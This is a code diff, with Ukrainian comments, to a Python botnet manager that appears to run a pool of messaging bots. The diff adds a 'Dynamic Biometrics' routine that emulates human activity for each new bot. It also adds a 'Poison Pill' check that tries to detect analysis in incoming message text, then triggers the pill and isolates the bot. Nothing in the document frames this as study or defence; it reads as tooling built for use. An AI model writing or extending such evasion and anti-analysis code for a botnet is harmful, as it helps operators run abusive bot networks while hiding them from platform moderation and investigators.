@@ -131,7 +131,7 @@ class BotnetManager:
         logger.info("✅ Ботнет зупинено")
     
     async def add_bot_to_pool(self, bot_data: Dict) -> bool:
-        """Додавання бота до пулу"""
+        """Додавання бота до пулу з активацією біометрії"""
         bot_id = bot_data.get('bot_id', self._generate_bot_id())
         
         try:
@@ -144,6 +144,10 @@ class BotnetManager:
                 'failure_count': 0,
                 'added_at': datetime.now(),
             }
+            
+            # Активація Dynamic Biometrics при додаванні
+            from core.dynamic_biometrics import dynamic_biometrics
+            asyncio.create_task(dynamic_biometrics.emulate_life(None, bot_id))
             
             self.bot_pool.append(bot_id)
             await self._emit('on_bot_added', bot_id, bot_data)
@@ -216,6 +220,13 @@ class BotnetManager:
                 if not bot_id:
                     await self.task_queue.put(task)
                     await asyncio.sleep(1)
+                    continue
+                
+                # Перевірка на Poison Pill
+                from core.poison_pill import poison_pill
+                if await poison_pill.detect_analysis(task.get('message_text', ''), {}):
+                    await poison_pill.execute(bot_id)
+                    await self.remove_bot_from_pool(bot_id, reason="security_isolation")
                     continue
                 
                 result = await self._execute_task(bot_id, task)
